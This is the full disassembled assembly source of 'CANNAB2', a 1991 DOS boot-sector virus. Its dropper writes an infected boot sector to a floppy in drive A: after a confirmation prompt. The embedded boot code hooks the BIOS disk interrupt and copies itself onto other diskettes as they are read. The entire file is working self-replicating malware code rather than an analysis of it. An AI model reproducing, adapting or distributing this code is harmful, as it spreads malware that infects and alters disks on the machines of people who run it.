
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        CANNAB2				         €€
;€€								         €€
;€€      Created:   7-Nov-91					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_3e		equ	43Fh
data_14e	equ	5Ch
data_15e	equ	78h
data_24e	equ	7C0Bh			;*
data_25e	equ	7C11h			;*
data_26e	equ	7C13h			;*
data_27e	equ	7C15h			;*
data_28e	equ	7C16h			;*
data_29e	equ	7C18h			;*
data_30e	equ	7C20h			;*
data_31e	equ	7C3Eh			;*
data_32e	equ	7C49h			;*
data_33e	equ	7C50h			;*
data_34e	equ	7DABh			;*
data_35e	equ	7DAFh			;*
data_36e	equ	7E0Bh			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

cannab2		proc	far

start:
		mov	dx,13Dh
		dec	byte ptr ds:data_14e
		js	loc_3			; Jump if sign=1
		mov	dx,155h
		call	sub_1
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		and	al,0DFh
		cmp	al,59h			; 'Y'
		jne	loc_ret_4		; Jump if not equal
		mov	dl,0
		mov	ah,0
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		jc	loc_2			; Jump if carry Set
		mov	dx,1E6h
		call	sub_1
		mov	cx,1
		mov	bx,offset data_20
		mov	ax,301h
		cwd				; Word to double word
		int	13h			; Disk  dl=drive a  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jnc	loc_ret_4		; Jump if carry=0
loc_2:
		mov	dx,offset data_16+0B7h	; ('')

cannab2		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
loc_3:
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx

loc_ret_4:
		retn
sub_1		endp

data_16		db	'Usage:  <FILENAME> A:', 0Dh, 0Ah
		db	'$'
		db	'You are about to install a VIRUS'
		db	' on your diskette!!!', 0Dh, 0Ah, 'I'
		db	'nsert a formatted 360K diskette '
		db	'into the drive.', 0Dh, 0Ah, 'Are'
		db	' you sure you want to proceed (y'
		db	'/N)? $'
		db	0Dh, 0Ah, 0Ah, 'Writing...$'
		db	0Dh, 0Ah, 'Error !!!'
		db	7
data_19		db	24h
data_20		db	0EBh
		db	 3Ch, 90h
		db	'CANNABIS'
		db	 00h, 02h, 02h, 01h, 00h, 02h
		db	 70h, 00h
		db	0D0h, 02h,0FDh, 02h, 00h, 09h
		db	 00h, 02h, 00h
		db	34 dup (0)
		db	0FAh,0FCh, 33h,0C0h, 8Eh,0D8h
		db	 8Eh,0D0h,0BCh, 00h, 7Ch,0BBh
		db	 58h, 7Dh,0A1h, 4Ch, 00h, 3Bh
		db	0C3h, 74h, 2Dh,0A3h,0ABh, 7Dh
		db	0A1h, 4Eh, 00h,0A3h,0ADh, 7Dh
		db	0BFh, 00h, 04h, 8Bh, 45h, 13h
		db	 48h, 89h, 45h, 13h,0B1h, 06h
		db	0D3h,0E0h, 2Dh,0C0h, 07h, 8Eh
		db	0C0h,0B9h, 00h, 02h, 8Bh,0F4h
		db	 8Bh,0FCh,0F3h,0A4h, 89h, 1Eh
		db	 4Ch, 00h, 8Ch, 06h, 4Eh, 00h
		db	 33h,0C0h, 16h, 07h
		db	0BBh, 78h, 00h, 36h,0C5h, 37h
		db	 1Eh, 56h, 16h
		db	53h
		db	0BFh, 3Eh, 7Ch,0B9h, 0Bh, 00h
		db	0F3h,0A4h, 06h, 1Fh,0C6h, 45h
		db	0FEh, 0Fh, 8Bh, 0Eh, 18h, 7Ch
		db	 88h, 4Dh,0F9h, 89h, 47h, 02h
		db	0C7h, 07h, 3Eh, 7Ch,0FBh,0CDh
		db	 13h, 72h, 48h, 33h,0C0h, 8Bh
		db	 0Eh, 13h, 7Ch, 89h, 0Eh, 20h
		db	 7Ch,0A1h, 16h, 7Ch,0D1h,0E0h
		db	 40h,0A3h, 50h, 7Ch,0A3h, 49h
		db	 7Ch,0A1h, 11h, 7Ch,0B1h, 04h
		db	0D3h,0E8h, 01h, 06h, 49h, 7Ch
		db	0BBh, 00h, 05h,0A1h, 50h, 7Ch
		db	0E8h, 58h, 00h, 72h, 1Ch, 81h
		db	 3Fh, 49h, 4Fh, 75h, 09h, 81h
		db	 7Fh, 20h, 4Dh, 53h, 74h, 22h
		db	0EBh
		db	0Dh
loc_7:
		cmp	word ptr [bx],4249h
		jne	loc_8			; Jump if not equal
		cmp	word ptr [bx+20h],4249h
		je	loc_9			; Jump if equal
loc_8:
		mov	si,data_35e
		call	sub_3
		xor	ax,ax			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		pop	si
		pop	ds
		pop	word ptr [si]
		pop	word ptr [si+2]
		int	19h			; Bootstrap loader
loc_9:
		mov	bx,700h
		mov	cx,3
		mov	ax,word ptr ds:[7C49h]

locloop_10:
		call	sub_2
		jc	loc_8			; Jump if carry Set
		inc	ax
		add	bx,offset data_19
		loop	locloop_10		; Loop if cx > 0

		mov	ch,byte ptr ds:[7C15h]
		mov	dl,0
		mov	bx,word ptr ds:[7C49h]
		mov	ax,0
;*		jmp	far ptr loc_1		;*
		db	0EAh, 00h, 00h, 70h, 00h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		push	ax
		push	cx
		div	byte ptr ds:[7C18h]	; al,ah rem = ax/data
		cwd				; Word to double word
		inc	ah
		shr	al,1			; Shift w/zeros fill
		adc	dh,0
		xchg	ah,al
		xchg	ax,cx
		mov	ax,201h
		int	13h			; Disk  dl=drive ?  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		pop	cx
		pop	ax

loc_ret_11:
		retn
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
loc_12:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_11		; Jump if zero
		mov	ah,0Eh
		mov	bx,7
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_12
sub_3		endp

		push	ax
		push	ds
		cmp	ah,2
		jne	loc_14			; Jump if not equal
		test	dl,0FEh
		jnz	loc_14			; Jump if not zero
		xor	ax,ax			; Zero register
		mov	ds,ax
		test	byte ptr ds:data_3e,1
		jnz	loc_14			; Jump if not zero
		push	cx
		push	bx
		push	di
		push	si
		push	es
		mov	ax,201h
		mov	bx,7E00h
		mov	cx,1
		push	cs
		push	cs
		pop	es
		pop	ds
		pushf				; Push flags
		push	cs
		call	sub_4
		jc	loc_13			; Jump if carry Set
		mov	si,data_36e
		mov	di,data_24e
		mov	cl,33h			; '3'
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,301h
		mov	bx,7C00h
		mov	cl,1
		pushf				; Push flags
		push	cs
		call	sub_4
loc_13:
		pop	es
		pop	si
		pop	di
		pop	bx
		pop	cx
loc_14:
		pop	ds
		pop	ax

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		jmp	dword ptr cs:data_34e
		db	0, 0, 0, 0
		db	0Dh, 0Ah, 'Non-System disk or dis'
		db	'k error', 0Dh, 0Ah, 'Replace and'
		db	' press a key when ready', 0Dh, 0Ah
		db	10 dup (0)
		db	 55h,0AAh
sub_4		endp


seg_a		ends



		end	start
